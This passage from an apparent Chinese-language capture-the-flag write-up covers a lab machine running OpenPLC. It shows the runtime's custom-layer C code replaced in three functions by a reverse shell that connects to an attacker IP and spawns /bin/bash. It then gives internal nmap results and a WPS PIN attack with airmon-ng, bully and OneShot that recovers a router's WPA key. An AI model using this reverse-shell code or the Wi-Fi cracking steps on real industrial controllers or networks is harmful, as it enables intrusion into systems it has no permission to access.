class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/socket.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;netinet/in.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;arpa/inet.h&gt;</span></span><br><span class="line">//-----------------------------------------------------------------------------</span><br><span class="line">// DISCLAIMER: EDDITING THIS FILE CAN BREAK YOUR OPENPLC RUNTIME! IF YOU DON<span class="string">&#x27;T</span></span><br><span class="line"><span class="string">// KNOW WHAT YOU&#x27;</span>RE DOING, JUST DON<span class="string">&#x27;T DO IT. EDIT AT YOUR OWN RISK.</span></span><br><span class="line"><span class="string">//</span></span><br><span class="line"><span class="string">// PS: You can always restore original functionality if you broke something</span></span><br><span class="line"><span class="string">// in here by clicking on the &quot;Restore Original Code&quot; button above.</span></span><br><span class="line"><span class="string">//-----------------------------------------------------------------------------</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//-----------------------------------------------------------------------------</span></span><br><span class="line"><span class="string">// These are the ignored I/O vectors. If you want to override how OpenPLC</span></span><br><span class="line"><span class="string">// handles a particular input or output, you must put them in the ignored</span></span><br><span class="line"><span class="string">// vectors. For example, if you want to override %IX0.5, %IX0.6 and %IW3</span></span><br><span class="line"><span class="string">// your vectors must be:</span></span><br><span class="line"><span class="string">//     int ignored_bool_inputs[] = &#123;5, 6&#125;; //%IX0.5 and %IX0.6 ignored</span></span><br><span class="line"><span class="string">//     int ignored_int_inputs[] = &#123;3&#125;; //%IW3 ignored</span></span><br><span class="line"><span class="string">//</span></span><br><span class="line"><span class="string">// Every I/O on the ignored vectors will be skipped by OpenPLC hardware layer</span></span><br><span class="line"><span class="string">//-----------------------------------------------------------------------------</span></span><br><span class="line"><span class="string">int ignored_bool_inputs[] = &#123;-1&#125;;</span></span><br><span class="line"><span class="string">int ignored_bool_outputs[] = &#123;-1&#125;;</span></span><br><span class="line"><span class="string">int ignored_int_inputs[] = &#123;-1&#125;;</span></span><br><span class="line"><span class="string">int ignored_int_outputs[] = &#123;-1&#125;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//-----------------------------------------------------------------------------</span></span><br><span class="line"><span class="string">// This function is called by the main OpenPLC routine when it is initializing.</span></span><br><span class="line"><span class="string">// Hardware initialization procedures for your custom layer should be here.</span></span><br><span class="line"><span class="string">//-----------------------------------------------------------------------------</span></span><br><span class="line"><span class="string">void initCustomLayer()</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">        int sockt;</span></span><br><span class="line"><span class="string">        int port = 10086;</span></span><br><span class="line"><span class="string">        struct sockaddr_in revsockaddr;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        sockt = socket(AF_INET, SOCK_STREAM,0);</span></span><br><span class="line"><span class="string">        revsockaddr.sin_family = AF_INET;       </span></span><br><span class="line"><span class="string">        revsockaddr.sin_port = htons(port);</span></span><br><span class="line"><span class="string">        revsockaddr.sin_addr.s_addr = inet_addr(&quot;10.10.x.x&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        connect(sockt, (struct sockaddr *) &amp;revsockaddr, </span></span><br><span class="line"><span class="string">        sizeof(revsockaddr));</span></span><br><span class="line"><span class="string">        dup2(sockt, 0);</span></span><br><span class="line"><span class="string">        dup2(sockt, 1);</span></span><br><span class="line"><span class="string">        dup2(sockt, 2);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        char * const argv[] = &#123;&quot;/bin/bash&quot;, NULL&#125;;</span></span><br><span class="line"><span class="string">        execve(&quot;/bin/bash&quot;, argv, NULL);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//-----------------------------------------------------------------------------</span></span><br><span class="line"><span class="string">// This function is called by OpenPLC in a loop. Here the internal input</span></span><br><span class="line"><span class="string">// buffers must be updated with the values you want. Make sure to use the mutex </span></span><br><span class="line"><span class="string">// bufferLock to protect access to the buffers on a threaded environment.</span></span><br><span class="line"><span class="string">//-----------------------------------------------------------------------------</span></span><br><span class="line"><span class="string">void updateCustomIn()</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">        int sockt;</span></span><br><span class="line"><span class="string">        int port = 10086;</span></span><br><span class="line"><span class="string">        struct sockaddr_in revsockaddr;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        sockt = socket(AF_INET, SOCK_STREAM,0);</span></span><br><span class="line"><span class="string">        revsockaddr.sin_family = AF_INET;       </span></span><br><span class="line"><span class="string">        revsockaddr.sin_port = htons(port);</span></span><br><span class="line"><span class="string">        revsockaddr.sin_addr.s_addr = inet_addr(&quot;10.10.xx.x&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        connect(sockt, (struct sockaddr *) &amp;revsockaddr, </span></span><br><span class="line"><span class="string">        sizeof(revsockaddr));</span></span><br><span class="line"><span class="string">        dup2(sockt, 0);</span></span><br><span class="line"><span class="string">        dup2(sockt, 1);</span></span><br><span class="line"><span class="string">        dup2(sockt, 2);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        char * const argv[] = &#123;&quot;/bin/bash&quot;, NULL&#125;;</span></span><br><span class="line"><span class="string">        execve(&quot;/bin/bash&quot;, argv, NULL);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        return 0;</span></span><br><span class="line"><span class="string">    // Example Code - Overwritting %IW3 with a fixed value</span></span><br><span class="line"><span class="string">    // If you want to have %IW3 constantly reading a fixed value (for example, 53)</span></span><br><span class="line"><span class="string">    // you must add %IW3 to the ignored vectors above, and then just insert this </span></span><br><span class="line"><span class="string">    // single line of code in this function:</span></span><br><span class="line"><span class="string">    //     if (int_input[3] != NULL) *int_input[3] = 53;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//-----------------------------------------------------------------------------</span></span><br><span class="line"><span class="string">// This function is called by OpenPLC in a loop. Here the internal output</span></span><br><span class="line"><span class="string">// buffers must be updated with the values you want. Make sure to use the mutex </span></span><br><span class="line"><span class="string">// bufferLock to protect access to the buffers on a threaded environment.</span></span><br><span class="line"><span class="string">//-----------------------------------------------------------------------------</span></span><br><span class="line"><span class="string">void updateCustomOut()</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">        int sockt;</span></span><br><span class="line"><span class="string">        int port = 10086;</span></span><br><span class="line"><span class="string">        struct sockaddr_in revsockaddr;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        sockt = socket(AF_INET, SOCK_STREAM,0);</span></span><br><span class="line"><span class="string">        revsockaddr.sin_family = AF_INET;       </span></span><br><span class="line"><span class="string">        revsockaddr.sin_port = htons(port);</span></span><br><span class="line"><span class="string">        revsockaddr.sin_addr.s_addr = inet_addr(&quot;10.10.x.x&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        connect(sockt, (struct sockaddr *) &amp;revsockaddr, </span></span><br><span class="line"><span class="string">        sizeof(revsockaddr));</span></span><br><span class="line"><span class="string">        dup2(sockt, 0);</span></span><br><span class="line"><span class="string">        dup2(sockt, 1);</span></span><br><span class="line"><span class="string">        dup2(sockt, 2);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        char * const argv[] = &#123;&quot;/bin/bash&quot;, NULL&#125;;</span></span><br><span class="line"><span class="string">        execve(&quot;/bin/bash&quot;, argv, NULL);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后跑起来start，接一下shell就getuser</p>
+<h2 id="root"><a href="#root" class="headerlink" title="root"></a>root</h2><p>这里ps看进程会发现个wpa_supplicant还是network的，没怎么在意所以权重挺低的，主要我没有用过这个东西。</p>
+<p><code>ip a</code>看到有张wlan0网卡，以为是环境没清干净</p>
+<p>翻了一顿没看到什么，回过头看<code>ip a</code>输出的ip不对劲</p>
+<p>网卡的eth0的ip和靶机的ip不相符，怀疑靶机外部ip是nat出来的</p>
+<p>说明可能会有内网环境，尝试<code>arp -a</code>看到个10.x.x.1疑似网关</p>
+<p>上传了一个nmap进行扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2024-03-19 05:25 UTC</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.0.3.1</span><br><span class="line">Host is up (0.000013s latency).</span><br><span class="line">Not shown: 65532 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">53/tcp   open  domain</span><br><span class="line">8080/tcp open  http-proxy</span><br><span class="line">MAC Address: 00:16:2E:00:00:00 (Xensource)</span><br></pre></td></tr></table></figure>
+
+<p>这里8080和53没东西</p>
+<p>但是机器不小心shell搞断了 所以重置一下机器</p>
+<p>重置时候看这机器图标是个路由器，才反应过来要打wifi</p>
+<p>wifi不太会打所以参考这篇<br><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-wifi#wps">hacktricks-WPS</a></p>
+<p>先给装一下<code>airmon-ng</code>和<code>airodump-ng</code>一个用来控制网卡监听一个用来抓包</p>
+<p>这两个装起来挺麻烦，下好拖进去so不一样用不了，所以朋友让用<a target="_blank" rel="noopener" href="https://github.com/ginuerzh/gost">gost</a>做apt转发，再参考这个<a target="_blank" rel="noopener" href="https://askubuntu.com/questions/257290/configure-proxy-for-apt">configure-proxy-for-apt</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Add this line to your /etc/apt/apt.conf file (substitute your details <span class="keyword">for</span> yourproxyaddress and proxyport).</span><br><span class="line"></span><br><span class="line">Acquire::http::Proxy <span class="string">&quot;http://yourproxyaddress:proxyport&quot;</span>;</span><br></pre></td></tr></table></figure>
+<p>当然也有别的办法，直接在里面编译也可以，或者用别的工具。</p>
+<p>弄完之后<code>airmon-ng start wlan0</code>把网卡拉到监听模式</p>
+<p>这时候<code>iwconfig</code>再看网卡名会变成wlan0mon</p>
+<p>再<code>airodump-ng wlan0mon</code>扫一下无线网里都有哪些设备</p>
+<p>不出意外的话这个时候能抓到另一个设备的ssid</p>
+<p>这时候就可以尝试一波暴力破解先<code>bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3</code></p>
+<p>然后就会发现卡住了</p>
+<p>换了个工具<a target="_blank" rel="noopener" href="https://github.com/nikita-yfh/OneShot-C">OneShot-C</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">root@attica01:/root<span class="comment"># ./oneshot -i wlan0mon -b 02:00:00:00:01:00 -K                                                                          </span></span><br><span class="line">[*] Running wpa_supplicant...                                                                                                               </span><br><span class="line">[*] Trying pin 12345670...                                                                                                                  </span><br><span class="line">[*] Scanning...                                                                                                                             </span><br><span class="line">[*] Authenticating...                                                                                                                       </span><br><span class="line">[+] Authenticated                                                                                                                           </span><br><span class="line">[*] Associating with AP...                                                                                                                  </span><br><span class="line">[+] Associated with 02:00:00:00:01:00 (ESSID: plcrouter)                                                                                    </span><br><span class="line">[*] Received Identity Request                                                                                                               </span><br><span class="line">[*] Sending Identity Response...                                                                                                            </span><br><span class="line">[*] Received WPS Message M1                                                                                                                 </span><br><span class="line">[P] E-Nonce: 4eed14d52d2b9e8705e7e73bfb6d0e38                                                                                               </span><br><span class="line">[*] Building Message M2                                                                                                                     </span><br><span class="line">[P] PKR: 6153ead28121131f32ddb1372cbc37ab58b405a1eb11d27fee470d0bcf00d964cf60c870af1f65ce4250744a263d939c81821a260ff80c5c83ed99182943cee6040e7cb7884a10bcea4a9a87ea732b46bb7f7b5b52423de24b1a2ba36ee3210bf210cc862ce121d1bb75906efa4bcb765fc7e7036f8a7a1938531561e609fca2dab7bed1085a8d29757fb4aed1696c8238b915bb3b07dfc2a26d0dcecdf1b8fb58b155789e33419e30353c405e69aa887bdf511ffd93fe383510e4595dbc79b6                           </span><br><span class="line">[P] PKE: 3e9b570cf842004164003d3c1d419a8c2666938dc2885ff5473bc844c20114e8a6cfd5df1fad26005d00a7788a8ea1db43bbb7eae67c7e56b9a0ef7b2f67403330a653e620ef0c3c36ab8ddc7e8e82669060cc5a60cbd6938ebdba4d5a3278dffe800af76427cbb089b8a91859112be071d03d3ba5446bba65a9e640e3e3d26afdd41dfe2ae9380aaccee7e81a2776075b675c36dba0b4d8f01490f17d4f9b8c1f4e8688430aa79d0efd9ab29b2f3b3bc45177f20815906a2b65cf74556fbc70                           </span><br><span class="line">[P] Authkey: 6275cd3d4d715cfd92dcfe3d1bf047d7424aef92b75906e3d9adad0cb3330bd1                                                               </span><br><span class="line">[*] Received WPS Message M3                                                                                                                 </span><br><span class="line">[P] E-Hash1: 836aa7979fc94a22bf35208238ad218657957d1544273a222c7e4f5dd0febedb                                                               </span><br><span class="line">[P] E-Hash2: ef24d67f056c8493c9eb5fea843d883c974bd635deaab3f03276903b9f14dcba                                                               </span><br><span class="line">[*] Building Message M4                                                                                                                     </span><br><span class="line">[*] Received WPS Message M5                                                                                                                 </span><br><span class="line">[*] Building Message M6                                                                                                                     </span><br><span class="line">[*] Received WPS Message M7                                                                                                                 </span><br><span class="line">[+] WPS PIN: 12345670                                                                                                                       </span><br><span class="line">[+] WPA PSK: NoWWEDoKnowWhaTisReal123!                                                                                                      </span><br><span class="line">[+] AP SSID: plcrouter</span><br></pre></td></tr></table></figure>
+<p>拿着密码去ssh 网关，getroot</p>
+
+        
+      </div>
+
+         
+    </div>
+    
+     
+  </div>
+  
+    
+<nav id="article-nav">
+  <a class="article-nav-btn left  disabled "
+     >
+    <i class="fa-solid fa-angle-left"></i>
+    <p class="title-text">
+        
+    </p>
+  </a>
+  <a class="article-nav-btn right "
+    
+      href="/2024/02/26/box-jab-wp/"
+      title="【season-4】htb jab wp"
+     >
+
+    <p class="title-text">
+      
+        【season-4】htb jab wp
+        
+    </p>
+    <i class="fa-solid fa-angle-right"></i>
+  </a>
+</nav>
+
+
+  
+</article>
+
+
+
+
+
+    </div>
+    <div id="footer-wrapper">
+      <footer id="footer">
+  
+  <div id="footer-info" class="inner">
+    
+    &copy; 2024 Flower<br>
+    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & Theme <a target="_blank" rel="noopener" href="https://github.com/saicaca/hexo-theme-vivia">Vivia</a>
+  </div>
+</footer>
+
+    </div>
+    <div class="back-to-top-wrapper">
+    <button id="back-to-top-btn" class="back-to-top-btn hide" onclick="topFunction()">
+        <i class="fa-solid fa-angle-up"></i>
+    </button>
+</div>
+
+<script>
+    function topFunction() {
+        window.scroll({ top: 0, behavior: 'smooth' });
+    }
+    let btn = document.getElementById('back-to-top-btn');
+    function scrollFunction() {
+        if (document.body.scrollTop > 600 || document.documentElement.scrollTop > 600) {
+            btn.classList.remove('hide')
+        } else {
+            btn.classList.add('hide')
+        }
+    }
+    window.onscroll = function() {
+        scrollFunction();
+    }
+</script>
+
+  </div>
+  <script src="/js/light-dark-switch.js"></script>
+</body>
+</html>
